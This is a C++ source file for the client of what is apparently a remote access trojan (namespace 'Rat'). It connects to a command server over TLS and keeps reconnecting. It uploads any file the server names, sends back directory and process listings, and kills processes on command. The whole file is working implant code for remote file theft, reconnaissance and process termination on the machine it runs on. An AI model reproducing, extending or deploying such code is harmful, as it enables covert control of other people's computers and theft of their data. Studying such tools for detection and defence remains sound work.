#include "Client.hpp"
#include <iostream>
#include <thread>
#include <random>
#include <fstream>
#include <csignal>     
#include <unistd.h>   
#include "FileSender.hpp"
#include "ProcessUtils.hpp"
#include "FileFolderUtils.hpp"
#include "Utils.hpp"
namespace Rat 
{

    std::string generateRandomData(size_t length) 
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(33, 126);
        std::string data;
        for (size_t i = 0; i < length; ++i) 
        {
            data += static_cast<char>(dis(gen));
        }
        return data;
    }

    Client::Client(const std::string& host, uint16_t port)
        : host_(host),
        port_(port),
        stopping_(false),
        networkManager_(),
        timer_(networkManager_.get_io_context())
    {
        networkManager_.setup_ssl_context_client("ca.crt", host_);
        // networkManager_.setup_ssl_context(false, "client.crt", "client.key", "ca.crt");
    }

    Client::~Client() 
    {
        stop();
    }

    void Client::start() 
    {
        initClientID();
        tryConnect();
        // input_thread_ = std::thread(&Client::handleUserInput, this);
        networkManager_.get_io_context().run();
    }

    void Client::stop() 
    {
        stopping_ = true;
        networkManager_.get_io_context().stop();
        if (socket_) socket_->lowest_layer().close();
        // if (input_thread_.joinable()) input_thread_.join();
    }

    void Client::initClientID(const std::string& path) 
    {
        std::fstream file(path, std::ios::in | std::ios::out | std::ios::app);
        if (!file.is_open()) 
        {
            std::cerr << "Cannot open file: " << path << "\n";
            return;
        }
        std::string client_id;
        std::getline(file, client_id);
        if (!client_id.empty() && std::all_of(client_id.begin(), client_id.end(), ::isdigit)) {
            try 
            {
                this_id_ = std::stoull(client_id);
                if (this_id_ > std::numeric_limits<uint64_t>::max()) {
                    this_id_ = -1; 
                }
            } 
            catch (const std::exception& e) 
            {
                this_id_ = -1;
            }
        } 
        else 
        {
            this_id_ = -1;
        }
        file.close();
    }

    void Client::tryConnect() 
    {
        if (stopping_) return;
        if (socket_) 
        {
            socket_->lowest_layer().close();
            socket_.reset();
            // std::cerr << "Debug: Closed previous socket\n";
        }
        socket_ = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(
            networkManager_.get_io_context(), networkManager_.get_ssl_context());
        boost::asio::ip::tcp::resolver resolver(networkManager_.get_io_context());
        auto endpoints = resolver.resolve(host_, std::to_string(port_));

        boost::asio::async_connect(socket_->lowest_layer(), endpoints,
            [this](const boost::system::error_code& ec, boost::asio::ip::tcp::endpoint) 
            {
                if (!ec) 
                {
                    // socket_->set_verify_mode(boost::asio::ssl::verify_peer);
                    socket_->async_handshake(boost::asio::ssl::stream_base::client,
                        [this](const boost::system::error_code& ec) 
                        {
                            if (!ec) 
                            {
                                std::cerr << "Connected to server: " << host_ << ":" << port_ << "\n";
                                sendClientId();
                                handleCommands();
                            } 
                            else 
                            {
                                std::cerr << "Handshake error: " << ec.message() << "\n";
                                scheduleReconnect();
                            }
                        });
                } 
                else 
                {
                    std::cerr << "Connection error: " << ec.message() << "\n";
                    scheduleReconnect();
                }
            });
    }

    void Client::sendClientId() 
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 999999);
        if (this_id_ == uint64_t(-1)) 
        {
            rat::Packet packet;
            packet.set_type(rat::Packet::STATIC_ID);
            std::string packet_id = "client_-1_" + std::to_string(dis(gen));
            packet.set_packet_id(packet_id.substr(0, 50)); 
            packet.set_source_id("client_-1");
            packet.set_destination_id("server_0");
            packet.set_encrypted(true);
            auto* chunked = packet.mutable_chunked_data();
            std::string data_id = "STATIC_ID_" + Utils::getCurrentTimeString().substr(0, 30) + std::to_string(dis(gen));
            chunked->set_data_id(data_id.substr(0, 100)); 
            chunked->set_sequence_number(0);
            chunked->set_total_chunks(1);
            chunked->set_payload("-1");
            chunked->set_success(true);
            networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
            {
                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
            });
        } 
        else 
        {
            rat::Packet packet;
            packet.set_type(rat::Packet::STATIC_ID);
            std::string packet_id = "client_" + std::to_string(this_id_) + "_" + std::to_string(dis(gen));
            packet.set_packet_id(packet_id.substr(0, 50));
            packet.set_source_id("client_" + std::to_string(this_id_));
            packet.set_destination_id("server_0");
            packet.set_encrypted(true);
            auto* chunked = packet.mutable_chunked_data();
            std::string data_id = "STATIC_ID_" + Utils::getCurrentTimeString().substr(0, 30) + std::to_string(dis(gen));
            chunked->set_data_id(data_id.substr(0, 100));
            chunked->set_sequence_number(0);
            chunked->set_total_chunks(1);
            chunked->set_payload(std::to_string(this_id_));
            chunked->set_success(true);
            networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
            {
                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
            });
        }
    }

    void Client::scheduleReconnect() 
    {
        if (stopping_) return;
        if (socket_) 
        {
            socket_->lowest_layer().close();
            socket_.reset();
            // std::cerr << "Debug: Closed socket for reconnect\n";
        }
        timer_.expires_from_now(boost::posix_time::seconds(5));
        timer_.async_wait([this](const boost::system::error_code& ec) 
        {
            if (!ec && !stopping_) 
            {
                std::cerr << "Retrying connection to server...\n";
                tryConnect();
            }
        });
    }

    void Client::handleCommands() 
    {
        if (stopping_) return;
        networkManager_.receive(socket_,
            [this](const rat::Packet& packet, const boost::system::error_code& ec) 
            {
                if (ec) 
                {   
                    if (ec == boost::asio::error::eof || ec == boost::asio::error::connection_reset || ec.value() == 1) 
                    {
                        std::cout << "[" << std::time(nullptr) << "] Connection lost, cleaning up and scheduling reconnect...\n";
                        if (current_file_sender_) 
                        {
                            current_file_sender_.reset(); 
                        }
                        if (current_process_sender_)
                        {
                            current_process_sender_.reset();
                        }
                        if (current_file_folder_sender_)
                        {
                            current_file_folder_sender_.reset();
                        }
                        if (socket_ && !stopping_) 
                        {
                            socket_->lowest_layer().close();
                            socket_.reset(); 
                        }
                        if (!stopping_) {
                            scheduleReconnect();
                        }
                        return;
                    } 
                    else 
                    {
                        std::cout << "[" << std::time(nullptr) << "] Receive error: " << ec.message() << "\n";
                        if (socket_ && !stopping_) 
                        {
                            socket_->lowest_layer().close();
                            socket_.reset(); 
                        }
                        if (!stopping_) {
                            scheduleReconnect();
                        }
                        return;
                    }
                }
                if (packet.has_chunked_data()) 
                {
                    // std::cerr << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                    //         std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                    switch (packet.type())
                    {
                        case rat::Packet::STATIC_ID:
                        {
                            try 
                            {
                                std::string payload = packet.chunked_data().payload();
                                if (!payload.empty() && std::all_of(payload.begin(), payload.end(), ::isdigit)) {
                                    this_id_ = std::stoull(payload);
                                    if (this_id_ > std::numeric_limits<uint64_t>::max()) {
                                        this_id_ = -1;
                                    }
                                    std::ofstream file("client_id.txt");
                                    if (file.is_open()) 
                                    {
                                        file << this_id_ << "\n";
                                        file.close();
                                    }
                                } 
                                else 
                                {
                                    this_id_ = -1;
                                }
                            } 
                            catch (const std::exception& e) 
                            {
                                this_id_ = -1;
                            }
                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                            break;
                        }
                        case rat::Packet::TRANSFER_FILE:
                        {
                            std::cerr << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                            std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                            std::cerr << "COMMAND FILE PATH FROM SERVER: " << packet.file_path() << std::endl;
                            std::ifstream test_file(packet.file_path(), std::ios::binary);
                            if (!test_file.is_open()) 
                            {
                                rat::Packet error_packet;
                                error_packet.set_type(rat::Packet::TRANSFER_FILE);
                                error_packet.set_packet_id(packet.packet_id());
                                error_packet.set_source_id("client_" + std::to_string(this_id_));
                                error_packet.set_destination_id("server_0");
                                error_packet.set_encrypted(true);

                                auto* chunk = error_packet.mutable_chunked_data();
                                chunk->set_data_id(packet.chunked_data().data_id());
                                chunk->set_sequence_number(0);
                                chunk->set_total_chunks(1);
                                chunk->set_payload("TRANSFER FILE | ARGUMENT ERROR | CANNOT OPEN FILE: " + packet.file_path());
                                chunk->set_success(false);

                                networkManager_.send(socket_, error_packet, [](const boost::system::error_code& ec) {
                                    if (ec) std::cerr << "Send error (TRANSFER_FILE error): " << ec.message() << std::endl;
                                });
                                boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                return;
                            }
                            current_file_sender_ = std::make_shared<FileSender>(socket_, networkManager_, this_id_, packet.file_path());
                            current_file_sender_->sendFile(
                                packet.file_path(),
                                Utils::getCurrentTimeString() + std::to_string(this_id_),
                                [this]() {
                                    std::cerr << "File transfer completed.\n";
                                    handleCommands();
                                    // boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                },
                                [this]() {
                                    std::cerr << "Connection lost during file transfer, scheduling reconnect...\n";
                                   if (current_file_sender_) 
                                    {
                                        current_file_sender_.reset();
                                    }
                                    if (socket_) 
                                    {
                                        socket_->lowest_layer().close();
                                        socket_.reset();
                                    }
                                    scheduleReconnect();
                                }
                            );
                            return;
                            break;
                        }
                        case rat::Packet::LIST_FILES_FOLDERS:
                        {    
                            std::cerr << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
                            std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                            // note check if path/level = packet.chunked_data().payload() not ok before listFilesFolders 
                            std::string response_list_files_folders = "LIST FILES AND FOLDER | SUCCESS";
                            std::string file_folder_data = FileFolderUtils::listFilesFolders(packet.chunked_data().payload(), response_list_files_folders); 
                            if(response_list_files_folders != "LIST FILES AND FOLDER | SUCCESS")
                            {
                                rat::Packet packet_list_files_folders;
                                packet_list_files_folders.set_type(rat::Packet::LIST_FILES_FOLDERS);
                                packet_list_files_folders.set_packet_id(packet.packet_id());
                                packet_list_files_folders.set_source_id("client_" + std::to_string(this_id_));
                                packet_list_files_folders.set_destination_id("server_0");
                                packet_list_files_folders.set_encrypted(true);
                                auto* chunk = packet_list_files_folders.mutable_chunked_data();
                                chunk->set_data_id(packet.chunked_data().data_id());
                                chunk->set_sequence_number(0);
                                chunk->set_total_chunks(1);
                                chunk->set_payload(response_list_files_folders);
                                chunk->set_success(false);
                                networkManager_.send(socket_, packet_list_files_folders, [](const boost::system::error_code& ec) 
                                {
                                    if (ec) std::cerr << "Send error: " << ec.message() << "\n";
                                });
                                boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                return;
                            }
                            std::cerr << "Debug size of file/folder list: " << file_folder_data.size() << std::endl;

                            current_file_folder_sender_ = std::make_shared<FileFolderSender>(socket_, networkManager_, this_id_, file_folder_data);
                            current_file_folder_sender_->sendFileFolders(
                                "LIST_FILES_FOLDERS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
                                [this]()
                                {
                                    std::cerr << "File/folder list transfer completed.\n";
                                    handleCommands();
                                },
                                [this]()
                                {
                                    std::cerr << "Connection lost during file/folder transfer, scheduling reconnect...\n";
                                    if (current_file_folder_sender_)
                                    {
                                        current_file_folder_sender_.reset();
                                    }
                                    if (socket_)
                                    {
                                        socket_->lowest_layer().close();
                                        socket_.reset();
                                    }
                                    scheduleReconnect();
                                }
                            );
                            break;
                        }
                        case rat::Packet::LIST_PROCESSES:
                        {  
                            std::cerr << "COMMAND TYPE FROM SERVER: " << packet.type() << std::endl;
                            std::cerr << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;

                            // Get process list
                            std::string process_data = formatProcessList(listProcesses());
                            std::cerr << "Debug size: " << process_data << std::endl;
                            current_process_sender_ = std::make_shared<ProcessSender>(socket_, networkManager_, this_id_, process_data);
                            current_process_sender_->sendProcesses(
                                "LIST_PROCESS_" + Utils::getCurrentTimeString() + std::to_string(this_id_),
                                [this]()
                                {
                                    std::cerr << "Process list transfer completed.\n";
                                    handleCommands();
                                },
                                [this]()
                                {
                                    std::cerr << "Connection lost during process transfer, scheduling reconnect...\n";
                                    if (current_process_sender_)
                                    {
                                        current_process_sender_.reset();
                                    }
                                    if (socket_)
                                    {
                                        socket_->lowest_layer().close();
                                        socket_.reset();
                                    }
                                    scheduleReconnect();
                                }
                            );
                            return;
                        }
                        case rat::Packet::KILL_PROCESS:
                        {
                            
                            std::string result_kill_process = "KILL PROCESS | SUCCESS";
                            auto pid = -1;
                            try 
                            {
                                pid = std::stoi(packet.chunked_data().payload());
                            } 
                            catch (const std::exception& e) 
                            {
                                pid = -1;
                            }
                            rat::Packet packet_kill_process;
                            packet_kill_process.set_type(rat::Packet::KILL_PROCESS);
                            packet_kill_process.set_packet_id(packet.packet_id());
                            packet_kill_process.set_source_id("client_" + std::to_string(this_id_));
                            packet_kill_process.set_destination_id("server_0");
                            packet_kill_process.set_encrypted(true);
                            auto* chunk = packet_kill_process.mutable_chunked_data();
                            chunk->set_data_id(packet.chunked_data().data_id());
                            chunk->set_sequence_number(0);
                            chunk->set_total_chunks(1);
                            if (pid == -1)
                            {
                                result_kill_process = "KILL PROCESS | ERROR PID NAME";
                                chunk->set_payload(result_kill_process);
                                chunk->set_success(true);
                                networkManager_.send(socket_, packet_kill_process, [](const boost::system::error_code& ec) 
                                {
                                    if (ec) std::cerr << "Send error: " << ec.message() << "\n";
                                });
                                boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                                return;
                            }
                            
                            if (kill(pid, SIGKILL) == 0) 
                            {
                                std::cerr << "Process " << pid << " is killed.\n";
                            } 
                            else 
                            {
                                result_kill_process = "KILL PROCESS | ERROR";
                                perror("Error kill process.\n");
                            }
                            chunk->set_payload(result_kill_process);
                            chunk->set_success(true);
                            networkManager_.send(socket_, packet_kill_process, [](const boost::system::error_code& ec) 
                            {
                                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
                            });                            
                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                            break;
                        }
                        default:
                        {

                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
                            break;
                        }
                    }
                    
                }
            });
    }
    // debug 2-way communication between server and client
    void Client::handleUserInput() 
    {
        std::string input;
        while (!stopping_ && std::getline(std::cin, input)) 
        {
            rat::Packet packet;
            packet.set_packet_id("client_" + std::to_string(std::rand()));
            packet.set_source_id("client_" + std::to_string(this_id_));
            packet.set_destination_id("server_0");
            auto* chunked = packet.mutable_chunked_data();
            chunked->set_payload(input);

            if (input == "list_files_folders") 
            {
                packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
            } 
            else if (input == "list_processes") 
            {
                packet.set_type(rat::Packet::LIST_PROCESSES);
            } 
            else if (input == "read_file") 
            {
                packet.set_type(rat::Packet::READ_FILE);
            } 
            else if (input == "kill_process") 
            {
                packet.set_type(rat::Packet::KILL_PROCESS);
            } 
            else 
            {
                continue;
            }

            networkManager_.send(socket_, packet, [](const boost::system::error_code& ec) 
            {
                if (ec) std::cerr << "Send error: " << ec.message() << "\n";
            });
        }
    }

} // namespace Rat